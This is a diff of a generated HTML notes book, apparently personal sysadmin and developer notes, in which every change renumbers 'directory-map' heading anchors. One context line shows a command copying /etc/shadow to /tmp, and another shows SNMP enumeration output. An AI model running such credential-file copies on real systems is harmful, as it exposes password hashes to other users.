@@ -33650,7 +34067,7 @@ https://rnemeth90.github.io/posts/2023-12-12-golang-url-validation/
 </ul>
 <div style="break-before: page; page-break-before: always;"></div>
 <h1 id="nginx"><a class="header" href="#nginx">Nginx</a></h1>
-<h2 id="directory-map-27"><a class="header" href="#directory-map-27">Directory Map</a></h2>
+<h2 id="directory-map-28"><a class="header" href="#directory-map-28">Directory Map</a></h2>
 <ul>
 <li><a href="#custom-header-response">custom-header-response</a></li>
 </ul>
@@ -33664,7 +34081,7 @@ https://rnemeth90.github.io/posts/2023-12-12-golang-url-validation/
 </code></pre>
 <div style="break-before: page; page-break-before: always;"></div>
 <h1 id="protocols-1"><a class="header" href="#protocols-1">Protocols</a></h1>
-<h2 id="directory-map-28"><a class="header" href="#directory-map-28">Directory Map</a></h2>
+<h2 id="directory-map-29"><a class="header" href="#directory-map-29">Directory Map</a></h2>
 <ul>
 <li><a href="#dns-3">dns</a></li>
 <li><a href="#ftp-2">ftp</a></li>
@@ -34729,7 +35146,7 @@ iso.3.6.1.2.1.25.6.3.1.2.1246 = STRING: "python3-apt_2.0.0ubuntu0.20.04.6_amd64"
 <h1 id="websockets"><a class="header" href="#websockets">WebSockets</a></h1>
 <div style="break-before: page; page-break-before: always;"></div>
 <h1 id="rate-limiting-algorithms"><a class="header" href="#rate-limiting-algorithms">Rate Limiting Algorithms</a></h1>
-<h2 id="directory-map-29"><a class="header" href="#directory-map-29">Directory Map</a></h2>
+<h2 id="directory-map-30"><a class="header" href="#directory-map-30">Directory Map</a></h2>
 <ul>
 <li><a href="#fixed-window-counter-algorithm">fixed-window-counter</a></li>
 <li><a href="#leaking-bucket-algorithm">leaking-bucket</a></li>
@@ -34886,7 +35303,7 @@ func main() {
 </code></pre>
 <div style="break-before: page; page-break-before: always;"></div>
 <h1 id="redis-1"><a class="header" href="#redis-1">Redis</a></h1>
-<h2 id="directory-map-30"><a class="header" href="#directory-map-30">Directory Map</a></h2>
+<h2 id="directory-map-31"><a class="header" href="#directory-map-31">Directory Map</a></h2>
 <ul>
 <li><a href="#redis-2">redis</a></li>
 </ul>
@@ -36867,7 +37284,7 @@ As stated above, most processes have the same EUID and RUID. As a result, the de
 </code></pre>
 <div style="break-before: page; page-break-before: always;"></div>
 <h1 id="bash-1"><a class="header" href="#bash-1">Bash</a></h1>
-<h2 id="directory-map-31"><a class="header" href="#directory-map-31">Directory Map</a></h2>
+<h2 id="directory-map-32"><a class="header" href="#directory-map-32">Directory Map</a></h2>
 <ul>
 <li><a href="#bash-notes">bash_notes</a></li>
 <li><a href="#moving-the-cursor-1">keyboard_shortcuts</a></li>
@@ -37142,7 +37559,7 @@ similarly Ctrl+v ENTER will display the escape sequence for the Enter key: ^M
 </code></pre>
 <div style="break-before: page; page-break-before: always;"></div>
 <h1 id="commands-4"><a class="header" href="#commands-4">Commands</a></h1>
-<h2 id="directory-map-32"><a class="header" href="#directory-map-32">Directory Map</a></h2>
+<h2 id="directory-map-33"><a class="header" href="#directory-map-33">Directory Map</a></h2>
 <ul>
 <li><a href="#chgrp">chgrp</a></li>
 <li><a href="#chmod">chmod</a></li>
@@ -37334,7 +37751,7 @@ PID        TTY     STAT   TIME          CMD
 <p>See page 37</p>
 <div style="break-before: page; page-break-before: always;"></div>
 <h1 id="greybeard-qualification-1"><a class="header" href="#greybeard-qualification-1">Greybeard Qualification</a></h1>
-<h2 id="directory-map-33"><a class="header" href="#directory-map-33">Directory Map</a></h2>
+<h2 id="directory-map-34"><a class="header" href="#directory-map-34">Directory Map</a></h2>
 <ul>
 <li><a href="#block-devices-and-file-systems">block_dev_and_file_systems</a></li>
 <li><a href="#memory-management-1">memory_management</a></li>
@@ -38480,7 +38897,7 @@ When the process calls exit():
 </ul>
 <div style="break-before: page; page-break-before: always;"></div>
 <h1 id="tools-4"><a class="header" href="#tools-4">Tools</a></h1>
-<h2 id="directory-map-34"><a class="header" href="#directory-map-34">Directory Map</a></h2>
+<h2 id="directory-map-35"><a class="header" href="#directory-map-35">Directory Map</a></h2>
 <ul>
 <li><a href="#need-to-addrefine">cli-tool-improvements</a></li>
 <li><a href="#instructions-for-using-dnspinger">dnspinger</a></li>
@@ -42586,7 +43003,7 @@ sudo cp /etc/shadow /tmp/shadow.bak
 </ul>
 <div style="break-before: page; page-break-before: always;"></div>
 <h1 id="troubleshooting-4"><a class="header" href="#troubleshooting-4">Troubleshooting</a></h1>
-<h2 id="directory-map-35"><a class="header" href="#directory-map-35">Directory Map</a></h2>
+<h2 id="directory-map-36"><a class="header" href="#directory-map-36">Directory Map</a></h2>
 <ul>
 <li><a href="troubleshooting/linux">linux</a></li>
 <li><a href="troubleshooting/troubleshooting_playbook">troubleshooting_playbook</a></li>
@@ -42641,7 +43058,7 @@ az aks nodepool update –resource-group rc-02us1-kubernetes-01-rg –cluster-na
 </ol>
 <div style="break-before: page; page-break-before: always;"></div>
 <h1 id="linux-1"><a class="header" href="#linux-1">Linux</a></h1>
-<h2 id="directory-map-36"><a class="header" href="#directory-map-36">Directory Map</a></h2>
+<h2 id="directory-map-37"><a class="header" href="#directory-map-37">Directory Map</a></h2>
 <ul>
 <li><a href="#troubleshooting-memory">memory</a></li>
 </ul>
@@ -42697,7 +43114,7 @@ az aks nodepool update –resource-group rc-02us1-kubernetes-01-rg –cluster-na
 </ul>
 <div style="break-before: page; page-break-before: always;"></div>
 <h1 id="troubleshooting-playbook"><a class="header" href="#troubleshooting-playbook">Troubleshooting Playbook</a></h1>
-<h2 id="directory-map-37"><a class="header" href="#directory-map-37">Directory Map</a></h2>
+<h2 id="directory-map-38"><a class="header" href="#directory-map-38">Directory Map</a></h2>
 <ul>
 <li><a href="#troubleshooting-503s-for-apps-in-kubernetes">kubernetes-containerized-app-503s</a></li>
 <li><a href="#general-troubleshootingnotes">kubernetes-general</a></li>
@@ -42811,7 +43228,7 @@ KubePodInventory
 </code></pre>
 <div style="break-before: page; page-break-before: always;"></div>
 <h1 id="what-happens-when"><a class="header" href="#what-happens-when">What Happens When…</a></h1>
-<h2 id="directory-map-38"><a class="header" href="#directory-map-38">Directory Map</a></h2>
+<h2 id="directory-map-39"><a class="header" href="#directory-map-39">Directory Map</a></h2>
 <ul>
 <li><a href="#what-happens-when-a-cpu-starts">a-cpu-starts</a></li>
 </ul>
